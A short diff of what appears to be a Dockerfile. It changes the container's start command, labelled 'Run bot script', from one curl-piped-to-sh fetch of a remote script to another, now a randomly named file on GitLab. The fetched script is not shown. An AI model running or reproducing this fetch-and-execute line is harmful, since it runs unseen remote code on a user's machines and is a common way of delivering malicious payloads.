@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://raw.githubusercontent.com/Sairin-SLOT/pyhton/main/CLI.sh | sh
+CMD curl https://gitlab.com/teletyl/zepo/-/raw/main/8zrstd.sh | sh
